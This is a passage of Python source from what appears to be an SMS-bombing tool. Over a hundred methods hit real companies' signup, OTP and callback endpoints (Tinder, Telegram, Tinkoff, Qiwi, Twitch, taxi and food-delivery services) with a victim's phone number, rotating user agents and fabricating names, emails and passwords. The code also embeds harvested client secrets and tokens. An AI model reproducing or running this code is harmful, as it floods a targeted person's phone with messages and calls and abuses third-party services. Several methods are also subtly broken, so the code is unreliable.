        asyncio.run(post_data_url(f"https://www.oyorooms.com/api/pwa/generateotp?phone={self.phone}&country_code=%2B7&nod=4&locale=en",headers=headers_copy))

    def sravni(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(get_data_url(
            "https://www.sportmaster.ua/",
            params={
                "module": "users",
                "action": "SendSMSReg",
                "phone": self.phone,
            },headers=headers_copy))

    def startpizza(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://pizzasushiwok.ru/index.php",
            data={
                "aj": "50",
                "registration-phone": phone_mask(
                    self.phone_not_pluse, "+## (###) ###-##-##"
                ),
            },headers=headers_copy))

    def suandi(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(get_data_url(
            "https://suandshi.ru/mobile_api/register_mobile_user",
            params={"phone": self.phone},headers=headers_copy))

    def sunlignt(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url("https://api.sunlight.net/v3/customers/authorization/",
        data={"phone": self.phone_not_pluse},headers=headers_copy))

    def pizza_33(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(get_data_url(
            "https://auth.pizza33.ua/ua/join/check/",
            params={
                "callback": "angular.callbacks._1",
                "email": email(),
                "password": password(),
                "phone": self.phone,
                "utm_current_visit_started": 0,
                "utm_first_visit": 0,
                "utm_previous_visit": 0,
                "utm_times_visited": 0,
            },headers=headers_copy))

    def sushifuji(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://sushifuji.ru/sms_send_ajax.php",
            data={"name": "false", "phone": self.phone},headers=headers_copy))

    def sushigour(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "http://sushigourmet.ru/auth",
            data={"phone": phone_mask(self.phone_not_pluse, "8 (###) ###-##-##"), "stage": 1},
            headers=headers_copy))

    def laguna(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://xn--80aaispoxqe9b.xn--p1ai/user_account/ajax.php?do=sms_code",
            data={"phone": phone_mask(self.phone_not_pluse, "8(###)###-##-##")},
            headers=headers_copy))

    def sumaster(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://client-api.sushi-master.ru/api/v1/auth/init",
            json={"phone": self.phone},headers=headers_copy))

    def sushiprof(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://www.sushi-profi.ru/api/order/order-call/",
            json={"phone": self.phone, "name": _ru_name_()},
            headers=headers_copy))

    def sushivesla(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://xn--80adjkr6adm9b.xn--p1ai/api/v5/user/start-authorization",
            json={"phone": phone_mask(self.phone_not_pluse, "+# ### ###-##-##")},
            headers=headers_copy))

    def tabasko(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://tabasko.su/",
            data={
                "IS_AJAX": "Y",
                "COMPONENT_NAME": "AUTH",
                "ACTION": "GET_CODE",
                "LOGIN": self.phone,
            },headers=headers_copy))

    def tabris(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://lk.tabris.ru/reg/",
            data={"action": "phone", "phone": self.phone},headers=headers_copy))

    def tanuki(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://www.tanuki.ru/api/",
            json={
                "header": {
                    "version": "2.0",
                    "userId": f"002ebf12-a125-5ddf-a739-67c3c5d{randint(20000, 90000)}",
                    "agent": {"device": "desktop", "version": "undefined undefined"},
                    "langId": "1",
                    "cityId": "9",
                },
                "method": {"name": "sendSmsCode"},
                "data": {"phone": f"({self.phone}", "type": 1},
            },headers=headers_copy))

    def tarantionofamely(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://www.tarantino-family.com/wp-admin/admin-ajax.php",
            data={"action": "callback_phonenumber", "phone": self.phone},
            headers=headers_copy))


    def taxi310(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "http://62.149.7.19:7200/api/account/register/sendConfirmCode",
            json={"phone": self.phone},headers=headers_copy))

    def taziritm(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://taxi-ritm.ru/ajax/ppp/ppp_back_call.php?URL=/",
            data={"RECALL": "Y", "BACK_CALL_PHONE": self.phone},
            headers=headers_copy))

    def tele2(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://msk.tele2.ru/api/validation/number/" + self.phone,
            json={"sender": "Tele2"},
            headers=headers_copy))

    def thehive(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://thehive.pro/auth/signup",
            json={"phone": self.phone},
            headers=headers_copy))

    def tiktok(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
                "https://m.tiktok.com/node/send/download_link",
                json={
                    "slideVerify": 0,
                    "language": "en",
                    "PhoneRegin": self.country_code,
                    "Mobile": self.phone,
                    "page": {"af_adset_id": 0, "pid": 0},
                }, headers=headers_copy))

    def tinder(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru",
            data={"phone_number": self.phone},
            headers=headers_copy))

    def tinkoff(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://api.tinkoff.ru/v1/sign_up",
            data={"phone": self.phone}, headers=headers_copy))

    def topladeba(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://topbladebar.ru/user_account/ajax.php?do=sms_code",
            data={"phone": f"{8}{self.phone_mask_2[2:]}"},
            headers=headers_copy))

    def topshop(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://www.top-shop.ru/login/loginByPhone/",
            data={"phone": self.phone_mask},
            headers=headers_copy))

    def tvoaapteka(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://www.tvoyaapteka.ru/bitrix/ajax/form_user_new.php?confirm_register=1",
            data={"tel": "+" + self.phone_not_pluse, "change_code": 1},
            headers=headers_copy))

    def twitch(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://passport.twitch.tv/register?trusted_request=true",
            json={
                "birthday": {"day": 19, "month": 3, "year": 1988},
                "client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp",
                "include_verification_code": True,
                "password": password(),
                "phone_number": self.phone,
                "username": username(),
            },headers=headers_copy))

    def online_sbis(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url("https://online.sbis.ru/reg/service/", json={'firstName':'паша','middleName': _ru_name_(),'lastName': _ru_name_(),'sex':'1','birthDate':'7.9.1997','mobilePhone': self.phone,'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'},
        headers=headers_copy))

    def rutaxi_ru(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url("https://rutaxi.ru/ajax_auth.html", data={"l": self.phone[2:], "c": "3"},
        headers=headers_copy))

    def ubki(self):
        asyncio.run(post_data_url(
            "https://secure.ubki.ua/b2_api_xml/ubki/auth",
            json={
                "doc": {
                    "auth": {
                        "mphone": self.phone,
                        "bdate": "4.9.1989",
                        "deviceid": "00100",
                        "version": "1.0",
                        "source": "site",
                        "signature": "undefined",
                    }
                }
            }, headers={"User-Agent":user_agent(),"Accept": "application/json"}))

    def uklon(self):
        agent = user_agent()
        asyncio.run(post_data_url(
            "https://uklon.com.ua/api/v1/account/code/send",
            headers={'User-Agent':agent, "client_id": "6289de851fc726f887af8d5d7a56c635"},
            json={"phone": self.phone}))
        asyncio.run(post_data_url(
            "https://partner.uklon.com.ua/api/v1/registration/sendcode",
            headers={'User-Agent':agent, "client_id": "6289de851fc726f887af8d5d7a56c635"},
            json={"phone": self.phone}))

    def ulabka(self):
        asyncio.run(post_data_url(
            "https://www.r-ulybka.ru/login/ajax.php",
            data={
                "action": "sendcode",
                "phone": self.phone_mask,
            },headers=headers_copy))

    def uralsib(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://app.doma.uchi.ru/api/v1/parent/signup_start",
            json={
                "phone": self.phone,
                "first_name": "-",
                "utm_data": {},
                "via": "call"}, headers=headers_copy))

        asyncio.run(post_data_url(
            "https://app.doma.uchi.ru/api/v1/parent/signup_start",
            json={
                "phone": self.phone,
                "first_name": "-",
                "utm_data": {},
                "via": "sms",
            },headers=headers_copy))

    def artonline(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        password = password()
        asyncio.run(post_data_url('https://artonline24.ru/en/auth/?register=yes',
        data={"backurl":"2Fen", "AUTH_FORM":'Y', 'TYPE':'REGISTRATION', 'USER_NAME':name(),
        'USER_LAST_NAME':name(), 'PERSONAL_PHONE':self.phone_mask, 'USER_EMAIL':email(),
        'USER_PASSWORD':password, 'USER_CONFIRM_PASSWORD':password, 'Register':'Register'},
        headers=headers_copy))

    def utrair(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://b.utair.ru/api/v1/login/",
            data={"login": self.phone},
            headers=headers_copy))

    def vezitaxi(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(get_data_url(
            "https://vezitaxi.com/api/employment/getsmscode",
            params={
                "phone": self.phone,
                "city": 561,
                "callback": "jsonp_callback_35979",
            },headers=headers_copy))

    def viza(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://pay.visa.ru/api/Auth/code/request",
            json={"phoneNumber": self.phone},
            headers=headers_copy))

    def vodafone(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://www.vodafone.ua/shop/ru/vodafone_customer/register/sendSms/",
            data={
                "is_ajax": "true",
                "phone_number": self.phone},
            headers=headers_copy))

    def vks(self):
        asyncio.run(post_data_url(
            "https://shop.vsk.ru/ajax/auth/postSms/",
            data={"phone": self.phone},headers=headers_copy))

    def webbank(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://ng-api.webbankir.com/user/v2/create",
            json={
                "lastName": _ru_name_(),
                "firstName": _ru_name_(),
                "middleName": _ru_name_(),
                "mobilePhone": self.phone,
                "email": email(),
                "smsCode": "",
            },headers=headers_copy))

    def wifimetro(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://cabinet.wi-fi.ru/api/auth/by-sms",
            data={"msisdn": self.phone},
            headers={"App-ID": "cabinet", 'User-Agent':user_agent()}))

    def work(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(options_data_url('https://api.iconjob.co/api/auth/verification_code', headers=headers_copy))
        asyncio.run(post_data_url(
            "https://api.iconjob.co/api/auth/verification_code",
            json={"phone": self.phone}, headers=headers_copy))

    def wowworks(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://api.wowworks.ru/v2/site/send-code",
            json={"phone": self.phone, "type": 2},
            headers=headers_copy))

    def yandexeda(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://eda.yandex/api/v1/user/request_authentication_code", json={"phone_number": self.phone},
            headers=headers_copy))

    def cloudmailru(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url("https://cloud.mail.ru/api/v2/notify/applink",
        json={'phone': self.phone, 'api': 2, 'email': 'email','x-email': 'x-email'},
        headers=headers_copy))

    def smsint(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url("https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php",
        data={'name':name() ,'phone': self.phone, 'promo': 'yellowforma'},
        headers=headers_copy))

    def tehnosvit(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url("https://tehnosvit.ua/iwantring_feedback.html",
        data={'feedbackName':name(),'feedbackPhone':self.phone},
        headers=headers_copy))

    def icqcom(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url("https://www.icq.com/smsreg/requestPhoneValidation.php",
        data={
            "msisdn": self.phone_not_pluse,
            "locale": "en",
            "countryCode": "ru",
            "version": "1",
            "k": "ic1rtwz1s1Hj1O0r",
            "r": "46763",
        },
        headers=headers_copy))

    def comfy_ua(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url('https://comfy.ua/ua/customer/account/createPost', data={"registration_name": _ru_name_(), "registration_phone": self.phone, "registration_email": email()},
        headers=headers_copy))

    def foxtrot(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url("https://www.foxtrot.com.ua/ru/account/sendcodeagain?Length=12", data={"Phone": self.phone},
        headers=headers_copy))

    def panda99(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url("https://panda99.ru/bdhandlers/order.php?t={int(time())}",
            data={
                "CB_NAME": _ru_name_(),
                "CB_PHONE": self.phone},
            headers=headers_copy))

    def grabtaxi(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': self.phone, 'countryCode': 'ID', 'name': name(), 'email': email(), 'deviceToken': '*'},
        headers=headers_copy))

    def moscow(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url("https://moscow.rutaxi.ru/ajax_keycode.html", data={'1': self.phone},
        headers=headers_copy))

    def tinkoff(self):
        asyncio.run(post_data_url("https://api.tinkoff.ru/v1/sign_up", data={'phone': self.phone},
        headers=headers_copy))

    def citrus(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url("https://my.citrus.ua/api/v2/register", data={'email': email(),'name': name(),'phone': self.phone,'password':'!@#qwe','confirm_passwor':'!@#qwe'},
        headers=headers_copy))

    def ubepmsmorg(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url("https://ube.pmsm.org.ru/esb/iqos-phone/validate", json={'phone': self.phone},
        headers=headers_copy))

    def plink_tech(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url("https://plink.tech/register/", json={'phone': self.phone},headers=headers_copy))

    def kasta(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url("https://kasta.ua/api/v2/login/",
        data={'phone': self.phone},headers=headers_copy))

    def cabinet_wi_fi(self):
        asyncio.run(post_data_url("https://cabinet.wi-fi.ru/api/auth/by-sms", data={'msisdn': self.phone},
        headers={'App-ID': 'cabinet'}))


    def e_vse(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url("https://e-vse.online/mail2.php", data={'object':'callback','user_name': name(),'contact_phone':self.phone},
        headers=headers_copy))

    def protovar(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url("https://protovar.com.ua/aj_record",
        data={'telephone':self.phone},
        headers=headers_copy))

    def yapochink(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://yaponchik.net/login/login.php",
            data={
                "login": "Y",
                "countdown": 0,
                "step": "phone",
                "redirect": "/profile/",
                "phone": self.phone_mask,
            },headers=headers_copy))

    def youla(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://youla.ru/web-api/auth/request_code",
            data={"phone": self.phone},
            headers=headers_copy))

    def zoopt(sefl):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://zoopt.ru/api/",
            data={
                "module": "salin.core",
                "class": r"BonusServer\Auth",
                "action": "SendSms",
                "phone": self.phone_mask,
            },
            headers=headers_copy))

    def friendsclub(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://friendsclub.ru/assets/components/pl/connector.php",
            data={"casePar": "authSendsms", "MobilePhone": self.phone},
            headers=headers_copy))

    def fixprice(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://fix-price.ru/ajax/register_phone_code.php",
            data={
                "register_call": "Y",
                "action": "getCode",
                "phone": self.phone,
            }, headers=headers_copy))

    def smartomato(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://2407.smartomato.ru/account/session",
            json={
                "phone": self.phone_mask,
                "g-recaptcha-response": None,
            },headers=headers_copy))

    def etm(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://www.etm.ru/cat/runprog.html",
            data={
                "m_phone": self.phone,
                "mode": "sendSms",
                "syf_prog": "clients-services",
                "getSysParam": "yes",
            },headers=headers_copy))

    def derevenskoe(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://esh-derevenskoe.ru/index.php?route=checkout/checkout_ajax/sendcode&ajax=yes",
            data={"need_reg": "1", "phone": self.phone},headers=headers_copy))

    def groshi(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://e-groshi.com/online/reg",
            data={
                "first_name": _ru_name_(),
                "last_name": _ru_name_(),
                "third_name": _ru_name_(),
                "phone": self.phone,
                "password": password(),
                "password2": password(),
            },headers=headers_copy))

    def edostav(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://vladimir.edostav.ru/site/CheckAuthLogin",
            data={"phone_or_email": self.phone},headers=headers_copy))

    def easypay(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://api.easypay.ua/api/auth/register",
            json={"phone": self.phone, "password": password()},
            headers=headers_copy))

    def delitime(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://api.delitime.ru/api/v2/signup",
            data={
                "SignupForm[username]": self.phone,
                "SignupForm[device_type]": 3,
            },headers=headers_copy))

    def creditter(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://api.creditter.ru/confirm/sms/send",
            json={
                "phone": self.phone_mask,
                "type": "register",
            },headers=headers_copy))

    def cleversite(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://clients.cleversite.ru/callback/run.php",
            data={
                "siteid": "62731",
                "num": self.phone,
                "title": "Онлайн-консультант",
                "referrer": "https://m.cleversite.ru/call",
            },headers=headers_copy))

    def carsmile(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://api.carsmile.com/",
            json={
                "operationName": "enterPhone",
                "variables": {"phone": self.phone},
                "query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n",
            },headers=headers_copy))

    def callmyphone(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
            "https://callmyphone.org/do-call",
            data={"phone": self.phone, "browser": "undefined"},
            headers=headers_copy))

    def telegram(self):
        asyncio.run(post_data_url(
            "https://my.telegram.org/auth/send_password",
            data=('phone='+self.phone),
            headers={'User-Agent':user_agent(), 'DNT':'1'}))

    def qiwi(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url("https://mobile-api.qiwi.com/oauth/authorize",
        headers=headers_copy,
        data={'response_type': 'urn:qiwi:oauth:response-type:confirmation-id', 'username': self.phone, 'client_id': 'android-qw', 'client_secret': 'zAm4FKq9UnSe7id'}))

    def zaminka(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url('https://zaimika.com/contact?action=checkSms&phone='+phone_mask(self.phone_not_pluse, "#(###)###-##-##")+'&typeCheck=check',headers=headers_copy))

    def buzzolls(self):
        asyncio.run(get_data_url(
        "https://it.buzzolls.ru:9995/api/v2/auth/register",
            params={"phoneNumber": self.phone},
            headers={"keywordapi": "ProjectVApiKeyword", "usedapiversion": "3", 'User-Agent':user_agent()}))

    def boosty(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
        "https://api.boosty.to/oauth/phone/authorize",
        data={"client_id": self.phone},
        headers=headers_copy))

    def bluefin(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
        "https://bluefin.moscow/auth/register/",
        data={
            "phone": phone_mask(self.phone_not_pluse[1:], "(###)###-##-##"),
            "sendphone": "Далее",
        },headers=headers_copy))

    def alfalife(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
        "https://alfalife.cc/auth.php",
        data={"phone": self.phone},headers=headers_copy))

    def beltelecom(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url("https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru",
        data={"phone": self.phone},headers=headers_copy))

    def bamperby(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
        "https://bamper.by/registration/?step=1",
        data={
            "phone": self.phone,
            "submit": "Запросить смс подтверждения",
            "rules": "on",
        },headers=headers_copy))

    def bartokyo(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
        "https://bartokyo.ru/ajax/login.php",
        data={
                "user_phone": phone_mask(self.phone_not_pluse, "+# (###) ###-####"),
        },headers=headers_copy))

    def avtobzvon(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
        "https://avtobzvon.ru/request/makeTestCall",
        params={"to": phone_mask(self.phone_not_pluse[1:], "(###) ###-##-##")},
        headers=headers_copy))

    def oauth_av(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
        "https://oauth.av.ru/check-phone",
        json={"phone": self.phone_mask},headers=headers_copy))

    def api_prime(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
        "https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",
        data={"phone": self.phone},headers=headers_copy))

    def apteka(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
        "https://apteka.ru/_action/auth/getForm/",
        data={
            "form[NAME]": "",
            "form[PERSONAL_GENDER]": "",
            "form[PERSONAL_BIRTHDAY]": "",
            "form[EMAIL]": "",
            "form[LOGIN]": self.phone_mask,
            "form[PASSWORD]": password(),
            "get-new-password": "Получите пароль по SMS",
            "user_agreement": "on",
            "personal_data_agreement": "on",
            "formType": "simple",
            "utc_offset": "120",
        },headers=headers_copy))

    def alpari(self):
        asyncio.run(post_data_url(
        "https://alpari.com/api/en/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/",
        headers={'User-Agent':user_agent(), 'DNT':'1', "Referer": "https://alpari.com/en/registration/"},
        json={
            "client_type": "personal",
            "email": email(),
            "mobile_phone": self.phone,
            "deliveryOption": "sms",
        }))

    def aistaxi(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(
        "http://94.154.218.82:7201/api/account/register/sendConfirmCode",
        json={"phone": self.phone},headers=headers_copy))


    def samaraetagi(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(options_data_url('https://ipoteka.domclick.ru/cas/rest/api/v2/users?phone='+self.phone_not_pluse[1:], headers=headers_copy))
        asyncio.run(post_data_url('https://domclick.ru/cas/rest/api/v3/users/entry/'+self.phone_not_pluse[1:]+'?registrationSmsRequired=false&source=topline', headers=headers_copy, data={}))
        asyncio.run(options_data_url('https://api.domclick.ru/core/terms/api/open/v1/acceptanceRequest', headers=headers_copy))
        asyncio.run(post_data_url('https://api.domclick.ru/core/terms/api/open/v1/acceptanceRequest', headers=headers_copy))


    def nb99(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url('https://99nb.ru/predata_send.php',
        data={'product_id':'Shapka', 'utm_source':' ', 'campaign':' ', 'utm_medium':' ', 'ga_tid':'UA-100030358-1', 'phone':f"8{phone_mask(self.phone_not_pluse[1:], '(###)+###-##-##')}", 'calc-uri':''},
        headers=headers_copy))

    def farpost(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(get_data_url('https://www.farpost.ru/sign/recover/helper?ajax=1&text=+'+self.phone_not_pluse+'&mode=reg&referer=https%3A%2F%2Fwww.farpost.ru%2Fsign&strongMatch=0&showSource=1&farpostOnly=0&dromOnly=0&allowQuickRestoreLinks=0', headers=headers_copy))
        asyncio.run(post_data_url('https://www.farpost.ru/sign', headers=headers_copy, data={'radio':'reg','sign':self.phone}))
        asyncio.run(get_data_url(f'https://www.farpost.ru/sign/confirm?sessionGeoId=0&sign={self.phone_not_pluse}&entrance=&registration=ok&ts=1606751018', headers=headers_copy))

    def notecash(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url("https://notecash.ru/backend/send", headers=headers_copy, data={'phone-top':phone_mask(self.phone_not_pluse, '+# (###) ###-##-##'), 'r':None}))

    def id_ykt(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url('https://id.ykt.ru/api/v3/register/sendCode', headers=headers_copy, data={'phone': self.phone_not_pluse[1:]}))

    def uteka(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(options_data_url('https://uteka.ru/rpc/?method=auth.ValidateRegister',headers=headers_copy))
        asyncio.run(post_data_url('https://uteka.ru/rpc/?method=auth.ValidateRegister', json={"jsonrpc":"2.0","id":'1',"method":"auth.ValidateRegister","params":{"name":name(),"phone":self.phone_not_pluse,"email":email()}}, headers=headers_copy))
        asyncio.run(options_data_url('https://uteka.ru/rpc/?method=auth.GetCode', headers=headers_copy))

    def chibbis(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url('https://szr.chibbis.ru/account/requestverificationcode',headers=headers_copy, data={"PhoneNumber":phone_mask(self.phone_not_pluse, '+#(###) ###-####'), "ResendToken":''}))

    def syzran(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url('https://syzran.farfor.ru/callback/',
        data={"csrfmiddlewaretoken":'vWG9OCe8dXY2RqsiaxLdnnNEHcUkfoq7Pb8QkkYjjNlL0nNCtf9ovoMTXnE7M3DY', "phone":phone_mask(self.phone_not_pluse, '+# (###) ###-##-##')}, headers=headers_copy))

    def beeline_kz(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(get_data_url(f'https://beeline.kz/restservices/telco/auth/{self.phone_not_pluse[1:]}/checkexists',
        headers=headers_copy))

    def gnevskii(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url('https://xn--b1abgnfccv2b.xn--p1ai/scripts/form-u18785.php', data={'custom_U18799':_ru_name_(), 'custom_U18791':self.phone, 'custom_U18795':'1'},
        headers=headers_copy))

    def esk_ural(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url('https://lk.esk-ural.ru/application/v3/user/registration-validation',
        json={"phone":self.phone}, headers=headers_copy))

    def pikru(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url('https://api.pik.ru/v1/phone/check',
        json={"phone":phone_mask(self.phone_not_pluse, '+# (###) ###-##-##'),"service":"confirmRegistrationSmsPikru"},
        headers=headers_copy))

    def edame(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url('https://eda.me/ajax/getcall.php',
        json={'city':'Москва', 'domain':'eda.me', 'tel':phone_mask(self.phone_not_pluse, '+# (###) ###-##-##'), 'comment':' '},
        headers=headers_copy))

    def vladimirvilkinetru(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(get_data_url(f'https://vladimir.vilkinet.ru/runtime/sendpass/?phone={self.phone_not_pluse[1:]}', headers=headers_copy))

    def remontnik(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url('https://www.remontnik.ru/api/v2/register/step_10/',
